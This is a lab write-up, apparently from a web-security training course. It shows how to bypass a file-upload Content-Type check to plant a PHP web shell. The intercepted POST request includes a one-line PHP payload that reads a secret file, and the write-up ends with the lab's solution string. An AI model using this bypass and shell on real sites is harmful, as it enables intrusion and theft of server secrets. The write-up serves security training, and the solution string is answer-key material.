### Lab: Web shell upload via Content-Type restriction bypass
---
#### Objective: Upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. 
**Tools Used**
Burpsuite Community Edition - Proxy Interceptor 
**Solving Steps**   
Opening the website, I first logged in to an account using the credentials provided by the lab. I was then shown the account interface. I switched on Burpsuite Proxy before uploaded my web-shell php file, reusing the lab-11-payload.php. 

Intercepting the POST request, I located the Content-Type for my reverse shell and replace the field with '**image/jpeg**', bypassing the server's validation. I forwarded the request and refreshed the page to look at the response given by my php web-shell, the secret file belonging to the target account.

```
POST /my-account/avatar HTTP/2
Host: 0a6d003a03fc6424802c2c6b007300a6.web-security-academy.net
Cookie: session=pnxQhPXapePyPlZq2zkN6OJWbJRKfWir
...

------geckoformboundary4984b6695b5261eb3b8578480f47afd4
Content-Disposition: form-data; name="avatar"; filename="lab-12-payload.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?> 
------geckoformboundary4984b6695b5261eb3b8578480f47afd4
Content-Disposition: form-data; name="user"

...

```

---
**Solution**
```
x1lYLG9ijtV9gKNvY2TC6oCeDEywD96c
```